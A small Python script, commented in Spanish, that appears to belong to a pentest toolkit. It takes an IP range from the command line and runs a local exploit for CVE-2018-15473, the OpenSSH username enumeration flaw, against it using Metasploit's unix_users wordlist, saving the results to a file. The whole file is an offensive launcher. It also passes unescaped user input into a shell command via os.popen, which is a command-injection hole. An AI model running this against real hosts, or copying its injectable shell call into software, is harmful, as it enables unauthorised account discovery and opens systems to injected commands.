#!/usr/bin/env python3
# _*_ coding: utf8 _*_

from scapy.all import *
import argparse #definir objetivo especifico con consola
import os

#puede escanear una ip o un rango

#permite la seleccion desde consola
parse=argparse.ArgumentParser()
parse.add_argument("-o","--rango",help="Rango de direcciones a escanear")
parse.add_argument("-f","--filepath",help="Lugar donde se va a guardar el archivo")
parse=parse.parse_args()

def func(ip,log): #detectar dispositivos conectados a la red
	path=os.getcwd()
	m=os.popen("python3 %s/modules/hosts/explotacion/cve-2018-15473.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt %s > %s.txt" %(path,ip,log)).read().split("\n") #.txt 
	print(m)


def main():
	if parse.rango and parse.filepath: #verificar si se incluyo alguna opcion
		func(parse.rango,parse.filepath) #pasamos la opcion q pase el usuario en la linea de comando
	else:
		print("Falta rango de ip")


if __name__ == '__main__':

	main()
